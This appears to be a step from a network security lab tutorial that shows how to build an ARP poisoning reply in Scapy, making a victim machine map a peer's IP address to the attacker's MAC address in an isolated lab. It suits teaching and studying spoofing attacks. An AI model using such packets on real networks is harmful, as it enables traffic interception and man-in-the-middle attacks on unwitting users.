### Construct the first ARP poisoning packet
**Objective:** First objective is to make the Victim Machine (10.9.0.5) associate User 1 Machine's IP address (10.9.0.6) with the Attacker Machine's MAC address.

14. In your current Scapy terminal, enter:


  ```javascript
arp_to_victim = ARP(
    op=2,
    psrc="10.9.0.6",
    hwsrc="02:42:4b:3d:79:e5",
    pdst="10.9.0.5",
    hwdst="02:42:0a:09:00:05"
)
  ```


15. run:

  ```javascript
arp_to_victim.show()
  ```
